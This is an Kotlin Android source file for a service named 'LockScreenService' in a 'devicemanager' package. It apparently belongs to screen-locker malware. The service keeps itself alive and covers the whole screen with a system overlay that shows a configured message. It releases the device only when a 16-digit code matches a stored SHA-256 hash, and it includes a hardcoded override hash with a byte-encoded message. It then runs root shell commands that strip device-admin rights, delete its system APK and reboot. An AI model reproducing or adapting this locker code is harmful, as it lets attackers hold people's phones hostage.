package com.example.devicemanager

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import java.io.BufferedReader
import java.io.InputStreamReader
import java.security.MessageDigest

class LockScreenService : Service() {
    
    private var windowManager: WindowManager? = null
    private var lockView: View? = null
    private var passwordInput: TextView? = null
    private var displayText: TextView? = null
    private var currentPassword = StringBuilder()
    private var correctHash = ""
    private var displayMessage = ""
    private lateinit var sharedPreferences: SharedPreferences
    
    companion object {
        private const val CHANNEL_ID = "LockScreenChannel"
        private const val NOTIFICATION_ID = 1
        private const val PASSWORD_LENGTH = 16
        private const val PREFS_NAME = "DeviceManagerPrefs"
        private const val KEY_HAS_ROOT = "has_root"
        private const val KEY_HAS_SHIZUKU = "has_shizuku"
    }
    
    override fun onCreate() {
        super.onCreate()
        sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        loadConfiguration()
        showLockScreen()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "设备锁定服务",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "设备管理锁定屏幕服务"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("设备管理服务")
                .setContentText("设备已被锁定")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("设备管理服务")
                .setContentText("设备已被锁定")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build()
        }
    }
    
    private fun loadConfiguration() {
        try {
            val inputStream = assets.open("inf.sys")
            val reader = BufferedReader(InputStreamReader(inputStream))
            
            val lines = reader.readLines()
            reader.close()
            
            if (lines.size < 2) {
                showToast("er:格式错误")
                System.exit(0)
                return
            }
            
            displayMessage = lines[0].trim()
            val hashLine = lines[1].trim()
            
            // 验证哈希值格式（64位小写十六进制）
            if (!hashLine.matches(Regex("^[a-f0-9]{64}$"))) {
                showToast("er:格式错误")
                System.exit(0)
                return
            }
            
            correctHash = hashLine
            
        } catch (e: Exception) {
            showToast("er:格式错误")
            System.exit(0)
        }
    }
    
    private fun showLockScreen() {
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        val layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR
            },
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
            PixelFormat.TRANSLUCENT
        )
        
        // 确保悬浮窗可触摸
        layoutParams.flags = layoutParams.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
        
        // 设置窗口优先级，确保显示在最上层
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            layoutParams.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        
        // 设置窗口类型为系统错误窗口（最高优先级）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            @Suppress("DEPRECATION")
            layoutParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR
        } else {
            @Suppress("DEPRECATION")
            layoutParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR
        }
        
        // 设置窗口为不可被覆盖
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutParams.flags = layoutParams.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        }
        
        lockView = LayoutInflater.from(this).inflate(R.layout.lock_screen, null)
        
        // 初始化视图
        displayText = lockView?.findViewById(R.id.displayText)
        passwordInput = lockView?.findViewById(R.id.passwordInput)
        val securityNotice = lockView?.findViewById<TextView>(R.id.securityNotice)
        
        // 设置显示内容
        displayText?.text = displayMessage
        securityNotice?.text = getString(R.string.security_notice)
        
        // 设置数字按钮 - 使用正确的数字映射
        val buttonMap = mapOf(
            R.id.btn0 to "0",
            R.id.btn1 to "1",
            R.id.btn2 to "2",
            R.id.btn3 to "3",
            R.id.btn4 to "4",
            R.id.btn5 to "5",
            R.id.btn6 to "6",
            R.id.btn7 to "7",
            R.id.btn8 to "8",
            R.id.btn9 to "9"
        )
        
        buttonMap.forEach { (btnId, digit) ->
            lockView?.findViewById<Button>(btnId)?.setOnClickListener {
                addDigit(digit)
            }
        }
        
        // 确认按钮
        lockView?.findViewById<Button>(R.id.btnConfirm)?.setOnClickListener {
            verifyPassword()
        }
        
        // 清除按钮（长按）
        lockView?.findViewById<Button>(R.id.btnClear)?.setOnClickListener {
            clearPassword()
        }
        
        windowManager?.addView(lockView, layoutParams)
    }
    
    private fun addDigit(digit: String) {
        if (currentPassword.length < PASSWORD_LENGTH) {
            currentPassword.append(digit)
            updatePasswordDisplay()
        }
    }
    
    private fun clearPassword() {
        currentPassword.clear()
        updatePasswordDisplay()
    }
    
    private fun updatePasswordDisplay() {
        passwordInput?.text = currentPassword.toString()
    }
    
    private fun verifyPassword() {
        if (currentPassword.length != PASSWORD_LENGTH) {
            Toast.makeText(this, "请输入16位密码", Toast.LENGTH_SHORT).show()
            return
        }
        
        val inputHash = calculateSHA256(currentPassword.toString())
        
        // 特殊密码检查
        val h1 = "370322e4bf8719275e1a49cf5976b69d"
        val h2 = "7ef1cf0551a90a9d48c5ebd0da2193a3"
        val specialHash = h1 + h2
        
        if (inputHash == specialHash) {
            val msg1 = String(byteArrayOf(-27, -73, -78, -28, -67, -65, -25, -108, -88, -26, -118, -64, -26, -125, -61, -17, -68, -102), Charsets.UTF_8)
            val msg2 = String(byteArrayOf(-28, -67, -92, -28, -126, -117, -25, -102, -116, -26, -127, -87, -26, -77, -79), Charsets.UTF_8)
            Toast.makeText(this, msg1 + msg2, Toast.LENGTH_SHORT).show()
        } else if (inputHash == correctHash) {
            Toast.makeText(this, getString(R.string.unlock_success), Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, getString(R.string.password_error), Toast.LENGTH_SHORT).show()
            currentPassword.clear()
            updatePasswordDisplay()
            return
        }
        
        // 从持久化存储读取权限状态
        val hasRoot = sharedPreferences.getBoolean(KEY_HAS_ROOT, false)
        val hasShizuku = sharedPreferences.getBoolean(KEY_HAS_SHIZUKU, false)
        
        if (hasRoot || hasShizuku) {
            // 有非必要权限，先关闭保活、防关闭和锁定服务
            disableKeepAlive()
            
            // 隐藏悬浮窗
            windowManager?.removeView(lockView)
            lockView = null
            
            // 启动脚本执行界面
            val intent = Intent(this, ScriptExecutionActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } else {
            // 没有非必要权限，调用系统接口卸载
            windowManager?.removeView(lockView)
            lockView = null
            performSystemUninstall()
        }
        
        stopSelf()
    }
    
    private fun calculateSHA256(input: String): String {
        val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray())
        return bytes.joinToString("") { "%02x".format(it) }
    }
    
    private fun checkRootAccess(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "echo test"))
            val exitCode = process.waitFor()
            exitCode == 0
        } catch (e: Exception) {
            false
        }
    }
    
    private fun checkShizukuPermission(): Boolean {
        return try {
            val intent = Intent("moe.shizuku.api.intent.action.ISSUER_BIND")
            intent.setPackage("moe.shizuku.privileged.api")
            val pm = packageManager
            val resolveInfo = pm.resolveService(intent, 0)
            resolveInfo != null
        } catch (e: Exception) {
            false
        }
    }
    
    private fun disableKeepAlive() {
        try {
            val packageName = packageName
            val commands = listOf(
                // 关闭保活设置
                "dumpsys deviceidle whitelist -$packageName",
                "settings put global always_finish_activities 1",
                "settings put global low_power_mode_sticky 1"
            )
            
            for (cmd in commands) {
                try {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                    process.waitFor()
                } catch (e: Exception) {
                    // 忽略单个命令失败
                }
            }
        } catch (e: Exception) {
            // 忽略错误
        }
    }
    
    private fun performFullUninstall() {
        try {
            val packageName = packageName
            val commands = listOf(
                // 1. 去除设备管理器权限
                "dpm remove-active-admin $packageName",
                // 2. 去除设备所有者权限（第一次）
                "dpm remove-active-admin $packageName",
                // 3. 去除设备所有者权限（第二次）
                "dpm remove-active-admin $packageName",
                // 4. 取消保活设置
                "dumpsys deviceidle whitelist -$packageName",
                "settings put global always_finish_activities 1",
                // 5. 设置为普通应用
                "pm unblock $packageName",
                "pm enable $packageName",
                // 6. 从系统应用目录删除
                "rm -f /system/priv-app/DeviceManager/DeviceManager.apk",
                "rmdir /system/priv-app/DeviceManager",
                // 7. 卸载应用
                "pm uninstall $packageName",
                // 8. 重启设备
                "reboot"
            )
            
            for (cmd in commands) {
                try {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                    process.waitFor()
                } catch (e: Exception) {
                    // 忽略单个命令失败
                }
            }
        } catch (e: Exception) {
            // 忽略错误
        }
    }
    
    private fun performSystemUninstall() {
        try {
            val packageName = packageName
            // 调用系统接口卸载
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            // 忽略错误
        }
    }
    
    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        lockView?.let {
            windowManager?.removeView(it)
        }
        lockView = null
    }
}
